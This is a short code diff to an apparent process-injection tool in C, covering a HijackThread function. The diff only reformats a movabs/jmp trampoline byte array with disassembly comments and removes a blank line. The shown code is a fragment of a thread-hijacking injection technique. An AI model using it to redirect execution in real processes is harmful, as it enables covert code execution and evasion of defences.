@@ -194,7 +194,10 @@ BOOL HijackThread(IN HANDLE hProc, IN HANDLE hThrd, IN PVOID pAddr)
 	DEBUG_PRINT("[*]Press Enter to write trampoline ...");
 	_INT;
 
-	unsigned char trmpl[] = { 0x48, 0xb8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0xff, 0xe0 };
+	unsigned char trmpl[] = {
+		0x48, 0xb8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,	// movabs rax, ...
+		0xff, 0xe0													// jmp rax
+	};
 	SIZE_T sBytesWritten = 0x0;
 	*(UINT_PTR*)(trmpl + 2) = (UINT_PTR)pAddr;
 	//for (DWORD i = 0; i < sizeof(trampoline); i++)
@@ -279,4 +282,3 @@ int wmain(int argc, wchar_t** argv)
 
 	return 0;
 }
-
